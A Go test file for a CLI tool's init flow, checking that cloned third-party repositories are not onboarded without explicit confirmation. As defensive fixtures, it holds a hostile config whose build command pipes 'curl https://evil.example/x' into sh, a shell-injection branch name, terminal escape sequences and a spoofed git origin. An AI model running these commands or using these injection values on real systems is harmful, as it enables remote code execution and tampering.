package cli

import (
	"bufio"
	"context"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/dimipaun/fugaro/internal/infra"
	"github.com/dimipaun/fugaro/internal/initflow"
	"github.com/dimipaun/fugaro/internal/localcfg"
	"github.com/dimipaun/fugaro/internal/testutil"
)

// unknownRepo makes the engine's local config not list the checkout's
// repository: the project has never onboarded it.
func unknownRepo(e *initEngine) *initEngine {
	e.lc.Repos = nil
	return e
}

func neverRun(t *testing.T) func(context.Context) error {
	return func(context.Context) error {
		t.Error("the repository engine ran: a cloud call for a repository nobody opted in")
		return nil
	}
}

// A freshly cloned third-party repository whose fugaro.yaml names this
// project is not onboarded, nor wired, on --yes or --non-interactive: both
// stages are needs-you with the one-line opt-in, nothing is written, and the
// engine (every cloud call) is never reached.
func TestHostileCloneNeedsOwnConfirmation(t *testing.T) {
	releaseBuild(t, "0.2.0")
	yaml := checkoutYAML("github", "oauth", "aurora", "")
	dir := repoCheckout(t, githubOrigin, yaml)
	t.Chdir(dir)
	for _, o := range []*initOptions{{yes: true}, {yes: true, nonInteractive: true, githubAppID: "12345"}} {
		e, _ := stageEngine(t, "acme/app\n", o) // an answer waiting on stdin is not read
		unknownRepo(e)
		fakeTerminal(t)
		rs := newRepositoryStage(e)
		rs.engineStage.run = neverRun(t)
		res, err := initflow.Run(t.Context(), []initflow.Stage{newPluginStage(e), rs}, e.options())
		if err != nil {
			t.Fatal(err)
		}
		if stateOf(res, "plugin") != initflow.NeedsYou || stateOf(res, "repository") != initflow.Blocked || len(res.Left) != 1 {
			t.Fatalf("%+v: stages %+v left %v", o, res.Stages, res.Left)
		}
		if l := res.Left[0].Text; !strings.HasSuffix(l, "init --onboard-repo acme/app") || strings.Contains(l, "\n") || strings.Contains(l, "&&") {
			t.Errorf("the opt-in line: %q", l)
		}
		if !strings.Contains(res.Stages[0].Detail, "repository stage was not reached") {
			t.Errorf("detail %q", res.Stages[0].Detail)
		}
		if _, err := os.Stat(filepath.Join(dir, ".claude", "settings.json")); err == nil {
			t.Fatal("the plugin was wired into an unknown repository")
		}
	}
	// The repository stage alone says the same.
	e, _ := stageEngine(t, "", &initOptions{yes: true})
	unknownRepo(e)
	rs := newRepositoryStage(e)
	rs.engineStage.run = neverRun(t)
	res, err := initflow.Run(t.Context(), []initflow.Stage{rs}, e.options())
	if err != nil || stateOf(res, "repository") != initflow.NeedsYou || len(res.Left) != 1 || !strings.Contains(res.Left[0].Text, "--onboard-repo acme/app") {
		t.Fatalf("%v %+v %v", err, res.Stages, res.Left)
	}
	// Applying it directly (a caller that skipped Check) is refused too.
	if _, err := rs.Apply(t.Context(), initflow.Env{Yes: true, Interactive: false}); err == nil {
		t.Error("Apply went ahead")
	}
}

// A repository the project lists behaves as it always did: --yes covers it.
func TestKnownRepoWithYesAsToday(t *testing.T) {
	dir := repoCheckout(t, githubOrigin, checkoutYAML("github", "oauth", "aurora", ""))
	t.Chdir(dir)
	e, _ := stageEngine(t, "", &initOptions{yes: true, githubAppID: "12345"})
	ran := false
	rs := newRepositoryStage(e)
	rs.engineStage.run = func(context.Context) error { ran = true; return nil }
	res, err := initflow.Run(t.Context(), []initflow.Stage{rs}, e.options())
	if err != nil || !ran || stateOf(res, "repository") != initflow.Done {
		t.Fatalf("%v ran %v %+v", err, ran, res.Stages)
	}
}

// --onboard-repo is the one non-interactive opt-in, and must be the origin
// repository exactly; a mismatch is refused, known repository or not.
func TestOnboardRepoFlag(t *testing.T) {
	releaseBuild(t, "0.2.0")
	dir := repoCheckout(t, githubOrigin, checkoutYAML("github", "oauth", "aurora", ""))
	t.Chdir(dir)
	e, _ := stageEngine(t, "", &initOptions{yes: true, nonInteractive: true, onboardRepo: "acme/app", githubAppID: "12345"})
	unknownRepo(e)
	ran := false
	rs := newRepositoryStage(e)
	rs.engineStage.run = func(context.Context) error { ran = true; return nil }
	res, err := initflow.Run(t.Context(), []initflow.Stage{newPluginStage(e), rs}, e.options())
	if err != nil || !ran || stateOf(res, "plugin") != initflow.Changed || stateOf(res, "repository") != initflow.Done {
		t.Fatalf("%v ran %v %+v", err, ran, res.Stages)
	}
	if _, err := os.Stat(filepath.Join(dir, ".claude", "settings.json")); err != nil {
		t.Errorf("the opted-in repository was not wired: %v", err)
	}
	for _, flag := range []string{"acme/other", "other/app", "acme/app2"} {
		for _, known := range []bool{false, true} {
			e, _ := stageEngine(t, "", &initOptions{yes: true, onboardRepo: flag})
			if !known {
				unknownRepo(e)
			}
			rs := newRepositoryStage(e)
			rs.engineStage.run = neverRun(t)
			res, err := initflow.Run(t.Context(), []initflow.Stage{rs}, e.options())
			if err != nil || res.Failed == nil || !strings.Contains(res.Failed.Error, "does not name this checkout's origin repository") {
				t.Errorf("--onboard-repo %s (known %v): %v %+v", flag, known, err, res)
			}
		}
	}
	// Its form is checked where it is given (init --repo takes it too).
	for _, args := range [][]string{{"init", "--onboard-repo", "nope"}, {"init", "--onboard-repo", "a/b", "--config-only"}} {
		if _, _, err := execute(t, args...); ExitCode(err) != ExitUserError || err == nil {
			t.Errorf("%v: %v", args, err)
		}
	}
}

// The typed confirmation names owner/name and the checkout's path; only the
// exact repository name opts it in, and one answer serves the plugin and the
// repository stages.
func TestTypedRepoConfirmation(t *testing.T) {
	releaseBuild(t, "0.2.0")
	dir := repoCheckout(t, githubOrigin, checkoutYAML("github", "oauth", "aurora", ""))
	t.Chdir(dir)
	fakeTerminal(t)
	for _, wrong := range []string{"yes\n", "acme\n", "ACME/APP\n", "\n"} {
		e, out := stageEngine(t, wrong, &initOptions{githubAppID: "12345"})
		unknownRepo(e)
		rs := newRepositoryStage(e)
		rs.engineStage.run = neverRun(t)
		res, err := initflow.Run(t.Context(), []initflow.Stage{newPluginStage(e), rs}, e.options())
		if err != nil || stateOf(res, "plugin") != initflow.NeedsYou || !strings.Contains(out.String(), "acme/app") || !strings.Contains(out.String(), dir) {
			t.Fatalf("answer %q: %v %+v\n%s", wrong, err, res.Stages, out.String())
		}
	}
	e, out := stageEngine(t, "acme/app\ny\n", &initOptions{githubAppID: "12345"})
	unknownRepo(e)
	runs := 0
	rs := newRepositoryStage(e)
	rs.engineStage.run = func(context.Context) error { runs++; return nil }
	res, err := initflow.Run(t.Context(), []initflow.Stage{newPluginStage(e), rs}, e.options())
	if err != nil || stateOf(res, "plugin") != initflow.Changed || stateOf(res, "repository") != initflow.Done || runs != 1 || strings.Count(out.String(), "Type acme/app") != 1 {
		t.Fatalf("%v runs %d %+v\n%s", err, runs, res.Stages, out.String())
	}
}

// The plugin is wired only into the checkout of a repository of this project:
// another project's file, or no origin, is skipped and --yes writes nothing.
func TestPluginStageNotInAForeignRepo(t *testing.T) {
	releaseBuild(t, "0.2.0")
	dir := repoCheckout(t, githubOrigin, checkoutYAML("github", "oauth", "borealis", ""))
	t.Chdir(dir)
	e, _ := stageEngine(t, "", &initOptions{yes: true, onboardRepo: "acme/app"})
	res := runPlugin(t, e)
	if st := res.Stages[0]; st.State != initflow.Skipped || !strings.Contains(st.Detail, "another project") {
		t.Fatalf("%+v", st)
	}
	if _, err := os.Stat(filepath.Join(dir, ".claude")); err == nil {
		t.Error("settings written into another project's repository")
	}
	// No origin at all.
	d2 := t.TempDir()
	testutil.Git(t, d2, "init", "-q")
	t.Chdir(d2)
	e, _ = stageEngine(t, "", &initOptions{yes: true})
	if st := runPlugin(t, e).Stages[0]; st.State != initflow.Skipped || !strings.Contains(st.Detail, "no origin") {
		t.Errorf("no origin: %+v", st)
	}
}

// A branch name can hold shell syntax and a fugaro.yaml terminal escapes:
// neither reaches the terminal raw, the printed fix is one command with the
// branch quoted as one word, and no && chain is printed.
func TestHostileBranchAndProblemText(t *testing.T) {
	dir := repoCheckout(t, githubOrigin, checkoutYAML("github", "oauth", "aurora", ""))
	t.Chdir(dir)
	evil := "x;touch${IFS}pwn|y&z$(id)'q"
	testutil.Git(t, dir, "update-ref", "refs/remotes/origin/"+evil, "main")
	testutil.Git(t, dir, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/"+evil)
	testutil.Git(t, dir, "update-ref", "-d", "refs/remotes/origin/main")
	if err := os.WriteFile(filepath.Join(dir, "fugaro.yaml"), []byte(checkoutYAML("github", "oauth", "aurora", "")+"# edited\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	e, _ := stageEngine(t, "", nil)
	st, err := newRepositoryStage(e).Check(t.Context())
	if err != nil || st.State != initflow.NeedsYou || st.Left == nil {
		t.Fatalf("%+v %v", st, err)
	}
	l := st.Left.Text
	if want := `git switch -- 'x;touch${IFS}pwn|y&z$(id)'\''q'`; l != want {
		t.Errorf("left %q, want %q", l, want)
	}
	if strings.Contains(l, "&&") || strings.Contains(l, "\n") || strings.Contains(st.Detail, "&&") {
		t.Errorf("a chain: %q / %q", l, st.Detail)
	}
	// Escapes in a problem text are neutralised.
	d2 := repoCheckout(t, githubOrigin, "version: 1\nproject: aurora\n\"\x1b]0;pwn\x07\x1b[31m\": 1\nworkflows: {}\n")
	t.Chdir(d2)
	e, _ = stageEngine(t, "", nil)
	st, err = newRepositoryStage(e).Check(t.Context())
	if err != nil {
		t.Fatal(err)
	}
	if strings.ContainsAny(st.Detail, "\x1b\x07") {
		t.Errorf("an escape reached the status: %q", st.Detail)
	}
	t.Logf("detail: %s", st.Detail)
	// A CRLF checkout of the same file is the same file.
	d3 := repoCheckout(t, githubOrigin, checkoutYAML("github", "oauth", "aurora", ""))
	t.Chdir(d3)
	if err := os.WriteFile(filepath.Join(d3, "fugaro.yaml"), []byte(strings.ReplaceAll(checkoutYAML("github", "oauth", "aurora", ""), "\n", "\r\n")), 0o644); err != nil {
		t.Fatal(err)
	}
	e, _ = stageEngine(t, "", nil)
	if st, _ := newRepositoryStage(e).Check(t.Context()); st.State != initflow.Todo {
		t.Errorf("CRLF: %+v", st)
	}
	// No origin/<default> ref: no default branch, and no fallback to a local one.
	d4 := repoCheckout(t, githubOrigin, checkoutYAML("github", "oauth", "aurora", ""))
	testutil.Git(t, d4, "update-ref", "-d", "refs/remotes/origin/main")
	testutil.Git(t, d4, "symbolic-ref", "--delete", "refs/remotes/origin/HEAD")
	t.Chdir(d4)
	e, _ = stageEngine(t, "", nil)
	if st, _ := newRepositoryStage(e).Check(t.Context()); st.State != initflow.Skipped || !strings.Contains(st.Detail, "git fetch") {
		t.Errorf("no origin ref: %+v", st)
	}
}

// The App ID given for a stage that skips is said to be unused.
func TestAppIDWarnedWhenUnused(t *testing.T) {
	dir := repoCheckout(t, githubOrigin, "")
	t.Chdir(dir)
	e, _ := stageEngine(t, "", &initOptions{githubAppID: "12345"})
	if st, _ := newRepositoryStage(e).Check(t.Context()); st.State != initflow.Skipped {
		t.Fatalf("%+v", st)
	}
	if len(e.r.res.Warnings) != 1 || !strings.Contains(e.r.res.Warnings[0], "--github-app-id is not used") {
		t.Errorf("warnings %v", e.r.res.Warnings)
	}
}

// Adopt mode copies what the outputs expose and says plainly what they do
// not; it never overwrites a config, refuses a name that is not the
// installation's, and writes the file 0600.
func TestAdoptCopiesWhatTheOutputsExpose(t *testing.T) {
	r := newInitRig(t)
	r.installationState(t)
	r.script["output"] = map[string]any{"stdout": outputsJSONWith(t, map[string]any{
		"launchers": []string{"group:eng@example.com"}, "registry_cleanup_dry_run": false,
		"log_view": "", "history_service_account": "fugaro-history@proj-1234.iam.gserviceaccount.com"})}
	r.save(t)
	e := adoptEngine(t, r, &initOptions{yes: true})
	var out strings.Builder
	e.r.w = &out
	if _, err := initflow.Run(t.Context(), []initflow.Stage{&preflightStage{e}, newInstallationStage(e)}, e.options()); err != nil {
		t.Fatal(err)
	}
	lc, err := localcfg.Load(e.path)
	if err != nil {
		t.Fatal(err)
	}
	if lc.Terraform.RegistryCleanup != "on" || !lc.Terraform.NoLogIsolation || !lc.Terraform.BudgetBackend {
		t.Errorf("terraform: %+v", lc.Terraform)
	}
	// What a later plan starts from is what the installation is.
	spec, err := installOptions(&initOptions{}, lc)
	if err != nil {
		t.Fatal(err)
	}
	if got := spec.Launchers; len(got) != 1 || got[0] != "group:eng@example.com" {
		t.Errorf("launchers %v", got)
	}
	vars, err := infra.InstallationVars(spec)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{`"enabled": true`, `"dry_run": false`} {
		if !strings.Contains(string(vars), want) {
			t.Errorf("the variables lack %s:\n%s", want, vars)
		}
	}
	if fi, err := os.Stat(e.path); err != nil || fi.Mode().Perm() != 0o600 {
		t.Errorf("mode %v, %v", fi, err)
	}
	for _, want := range []string{"alert email", "scheduler region", "do not apply an installation plan from here", "--alert-email"} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("the adopt message lacks %q:\n%s", want, out.String())
		}
	}
	// An existing file is never overwritten.
	before, _ := os.ReadFile(e.path)
	e2 := adoptEngine(t, r, &initOptions{yes: true})
	e2.path = e.path
	res, err := initflow.Run(t.Context(), []initflow.Stage{&preflightStage{e2}, newInstallationStage(e2)}, e2.options())
	after, _ := os.ReadFile(e.path)
	if err != nil || res.Failed == nil || !strings.Contains(res.Failed.Error, "never overwrites") || string(before) != string(after) {
		t.Errorf("overwrite: %v %+v", err, res.Failed)
	}
}

// The installation's own name wins: a local name that is not it is refused
// and nothing is written.
func TestAdoptRefusesAnotherName(t *testing.T) {
	r := newInitRig(t)
	r.installationState(t)
	r.script["output"] = map[string]any{"stdout": outputsJSONWith(t, map[string]any{"project_name": "borealis"})}
	r.save(t)
	e := adoptEngine(t, r, &initOptions{yes: true})
	res, err := initflow.Run(t.Context(), []initflow.Stage{&preflightStage{e}, newInstallationStage(e)}, e.options())
	if err != nil || res.Failed == nil || !strings.Contains(res.Failed.Error, "borealis") {
		t.Fatalf("%v %+v", err, res.Failed)
	}
	if _, err := os.Stat(e.path); err == nil {
		t.Error("a config was written for another name")
	}
}

func TestQuoteWord(t *testing.T) {
	for in, want := range map[string]string{
		"main":          "main",
		"feature/x-1":   "feature/x-1",
		"":              "''",
		"-x":            "'-x'",
		"--upload-pack": "'--upload-pack'",
		"a b":           "'a b'",
		"a;b":           "'a;b'",
		"$(id)":         "'$(id)'",
		"it's":          `'it'\''s'`,
		"a\nb":          "'a\nb'",
		"a|b&c":         "'a|b&c'",
	} {
		if got := quoteWord(in); got != want {
			t.Errorf("quoteWord(%q) = %q, want %q", in, got, want)
		}
	}
}

// A known owner/name on another host is not the known repository: --yes and
// --onboard-repo (which names no host) do not cover it, only the typed
// confirmation with the host in it does. Lookalike hosts included.
func TestKnownNameOnAnotherHostIsUnknown(t *testing.T) {
	for _, host := range []string{"evil.example", "github.com.evil.example", "gíthub.com"} {
		dir := repoCheckout(t, "https://"+host+"/acme/app.git", checkoutYAML("github", "oauth", "aurora", "\n"))
		t.Chdir(dir)
		e, _ := stageEngine(t, "", &initOptions{yes: true, onboardRepo: "acme/app", githubAppID: "12345"})
		rs := newRepositoryStage(e)
		rs.engineStage.run = neverRun(t)
		res, err := initflow.Run(t.Context(), []initflow.Stage{rs}, e.options())
		if err != nil || stateOf(res, "repository") != initflow.NeedsYou || len(res.Left) != 1 {
			t.Fatalf("%s: %v %+v", host, err, res.Stages)
		}
		if !strings.Contains(res.Stages[0].Detail, host) || !strings.Contains(res.Left[0].Text, host+"/acme/app") {
			t.Errorf("%s: the host is not said: %q / %q", host, res.Stages[0].Detail, res.Left[0].Text)
		}
	}
	// A known name on the other provider's own host: without the flag it is
	// unknown too (the flag, being explicit, opts it in on a provider's host).
	dir := repoCheckout(t, "https://bitbucket.org/acme/app.git", checkoutYAML("github", "oauth", "aurora", ""))
	t.Chdir(dir)
	e, _ := stageEngine(t, "", &initOptions{yes: true, githubAppID: "12345"})
	rs := newRepositoryStage(e)
	rs.engineStage.run = neverRun(t)
	if res, err := initflow.Run(t.Context(), []initflow.Stage{rs}, e.options()); err != nil || stateOf(res, "repository") != initflow.NeedsYou {
		t.Errorf("bitbucket.org: %v %+v", err, res.Stages)
	}
	// Typed with its host it goes ahead; the bare name does not.
	fakeTerminal(t)
	for typed, want := range map[string]bool{"acme/app\n": false, "evil.example/acme/app\n": true} {
		dir := repoCheckout(t, "https://evil.example/acme/app.git", checkoutYAML("github", "oauth", "aurora", ""))
		t.Chdir(dir)
		e, out := stageEngine(t, typed, &initOptions{githubAppID: "12345"})
		ran := false
		rs := newRepositoryStage(e)
		rs.engineStage.run = func(context.Context) error { ran = true; return nil }
		if _, err := initflow.Run(t.Context(), []initflow.Stage{rs}, e.options()); err != nil || ran != want || !strings.Contains(out.String(), "host evil.example") {
			t.Errorf("typed %q: ran %v, err %v\n%s", typed, ran, err, out.String())
		}
	}
}

// A checkout shipping its own .git/config can rewrite its origin so that git
// resolves it to a known github.com repository: the raw URL and the resolved
// one must agree, else it is unknown, and no flag opts it in.
func TestInsteadOfRewrittenOriginIsUnknown(t *testing.T) {
	releaseBuild(t, "0.2.0")
	dir := repoCheckout(t, "https://evil.example/acme/app.git", checkoutYAML("github", "oauth", "aurora", ""))
	f, err := os.OpenFile(filepath.Join(dir, ".git", "config"), os.O_APPEND|os.O_WRONLY, 0)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.WriteString("[url \"https://github.com/\"]\n\tinsteadOf = https://evil.example/\n"); err != nil {
		t.Fatal(err)
	}
	f.Close()
	t.Chdir(dir)
	if got := testutil.Git(t, dir, "remote", "get-url", "origin"); got != "https://github.com/acme/app.git" {
		t.Fatalf("the fixture does not rewrite: %q", got)
	}
	e, _ := stageEngine(t, "", &initOptions{yes: true, onboardRepo: "acme/app", githubAppID: "12345"})
	rs := newRepositoryStage(e)
	rs.engineStage.run = neverRun(t)
	res, err := initflow.Run(t.Context(), []initflow.Stage{newPluginStage(e), rs}, e.options())
	if err != nil || stateOf(res, "plugin") != initflow.NeedsYou || !strings.Contains(res.Stages[0].Detail, "rewritten by git config") {
		t.Fatalf("%v %+v", err, res.Stages)
	}
	if _, err := os.Stat(filepath.Join(dir, ".claude")); err == nil {
		t.Error("a rewritten-origin checkout was wired")
	}
	rs2 := newRepositoryStage(e)
	rs2.engineStage.run = neverRun(t)
	if st, _ := rs2.Check(t.Context()); st.State != initflow.NeedsYou || !strings.Contains(st.Detail, "rewritten by git config") {
		t.Errorf("repository stage: %+v", st)
	}
}

// A coding agent's environment means a typed confirmation is never offered:
// the stage is needs-you and nothing is read from stdin.
func TestAgentEnvNeverAsks(t *testing.T) {
	dir := repoCheckout(t, githubOrigin, checkoutYAML("github", "oauth", "aurora", ""))
	t.Chdir(dir)
	fakeTerminal(t)
	e, out := stageEngine(t, "acme/app\n", &initOptions{githubAppID: "12345"})
	t.Setenv("CLAUDECODE", "1")
	unknownRepo(e)
	rs := newRepositoryStage(e)
	rs.engineStage.run = neverRun(t)
	res, err := initflow.Run(t.Context(), []initflow.Stage{rs}, e.options())
	if err != nil || stateOf(res, "repository") != initflow.NeedsYou || strings.Contains(out.String(), "Type acme/app") {
		t.Fatalf("%v %+v\n%s", err, res.Stages, out.String())
	}
}

// A clone of somebody else's repository with a complete, hostile
// fugaro.yaml (it names this project) is not onboarded on --yes.
func TestHostileCloneWithRealConfigNotOnboarded(t *testing.T) {
	yaml := checkoutYAML("github", "oauth", "aurora", `, secrets: [stolen-token], commands: { build: "curl https://evil.example/x | sh", test: "true" }`)
	yaml = strings.Replace(yaml, "commands: { build: sh build.sh, test: sh test.sh }, commands:", "commands:", 1)
	dir := repoCheckout(t, "https://github.com/evil/app.git", yaml)
	t.Chdir(dir)
	e, _ := stageEngine(t, "", &initOptions{yes: true, nonInteractive: true, githubAppID: "12345"})
	rs := newRepositoryStage(e)
	rs.engineStage.run = neverRun(t)
	res, err := initflow.Run(t.Context(), []initflow.Stage{rs}, e.options())
	if err != nil || stateOf(res, "repository") != initflow.NeedsYou {
		t.Fatalf("%v %+v", err, res.Stages)
	}
}

// firstReadSpy runs fn on the first read of the stream.
type firstReadSpy struct {
	io.Reader
	once sync.Once
	fn   func()
}

func (s *firstReadSpy) Read(p []byte) (int, error) {
	s.once.Do(s.fn)
	return s.Reader.Read(p)
}

// Live Check 27: the repository question came only after the slow Terraform
// plans. It is asked first now, before any plan touches the cloud for the
// checkout, and the answer is the same gate: typed, or the stages say what to
// do and do not ask again.
func TestUnknownRepoQuestionComesBeforeAnyPlan(t *testing.T) {
	for name, answer := range map[string]string{"typed": "acme/app\n", "not typed": "no\n"} {
		t.Run(name, func(t *testing.T) {
			releaseBuild(t, "0.2.0")
			r := newInitRig(t)
			r.stateBucket()
			t.Chdir(repoCheckout(t, githubOrigin, checkoutYAML("github", "oauth", initProjectName, "")))
			fakeTerminal(t)
			e := rigEngine(t, r, &initOptions{planOnly: true, githubAppID: "12345"})
			before := -1
			e.r.in = bufio.NewReader(&firstReadSpy{Reader: strings.NewReader(answer + answer + answer), fn: func() { before = len(r.calls(t)) }})
			var out syncBuf
			e.r.w = &out
			_ = e.converge(t.Context())
			if before != 0 {
				t.Fatalf("the question was asked after %d terraform calls, want before the first", before)
			}
			if n := strings.Count(out.String(), "Type acme/app"); n != 1 {
				t.Errorf("the question was asked %d times, want once:\n%s", n, out.String())
			}
			if len(r.calls(t)) == 0 {
				t.Error("no stage planned after the question")
			}
			if name == "not typed" && !strings.Contains(out.String(), "--onboard-repo acme/app") {
				t.Errorf("not typed, and the opt-in line is missing:\n%s", out.String())
			}
		})
	}
	// --yes never asks, early or late: nothing is typed for it.
	r := newInitRig(t)
	r.stateBucket()
	t.Chdir(repoCheckout(t, githubOrigin, checkoutYAML("github", "oauth", initProjectName, "")))
	fakeTerminal(t)
	e := rigEngine(t, r, &initOptions{planOnly: true, yes: true, githubAppID: "12345"})
	asked := false
	e.r.in = bufio.NewReader(&firstReadSpy{Reader: strings.NewReader("acme/app\n"), fn: func() { asked = true }})
	e.r.w = &syncBuf{}
	_ = e.converge(t.Context())
	if asked {
		t.Error("--yes asked for the repository")
	}
}

// An installation-only flag run inside a checkout of a repository the project
// does not list yet gets one note before the guard's prompt: init in a
// checkout also onboards its repository. Nothing else prints it, and the
// guard itself is unchanged.
func TestInstallationFlagNoteInUnonboardedCheckout(t *testing.T) {
	const note = "this checkout's repository is not onboarded; init in a checkout also onboards its repository. To set up only the installation, run fugaro init from outside the checkout."
	releaseBuild(t, "0.2.0")
	checkout := func(t *testing.T) {
		t.Chdir(repoCheckout(t, githubOrigin, checkoutYAML("github", "oauth", "aurora", "")))
	}
	for name, tc := range map[string]struct {
		o       *initOptions
		known   bool
		outside bool
		want    int
	}{
		"--base, unknown repo":       {o: &initOptions{baseKinds: []string{"web-node"}}, want: 1},
		"--budget, unknown repo":     {o: &initOptions{budget: 5}, want: 1},
		"two flags, still once":      {o: &initOptions{baseKinds: []string{"go"}, budget: 5}, want: 1},
		"no installation flag":       {o: &initOptions{}, want: 0},
		"--base, repository listed":  {o: &initOptions{baseKinds: []string{"web-node"}}, known: true, want: 0},
		"--base, outside a checkout": {o: &initOptions{baseKinds: []string{"web-node"}}, outside: true, want: 0},
	} {
		t.Run(name, func(t *testing.T) {
			if tc.outside {
				t.Chdir(t.TempDir())
			} else {
				checkout(t)
			}
			fakeTerminal(t)
			e, out := stageEngine(t, "no\n", tc.o)
			if !tc.known {
				unknownRepo(e)
			}
			e.repo = newRepositoryStage(e)
			e.gateEarly(t.Context())
			if n := strings.Count(out.String(), note); n != tc.want {
				t.Errorf("the note printed %d times, want %d:\n%s", n, tc.want, out.String())
			}
			if tc.want == 1 && strings.Index(out.String(), note) > strings.Index(out.String(), "Type acme/app") {
				t.Errorf("the note came after the prompt:\n%s", out.String())
			}
		})
	}
}
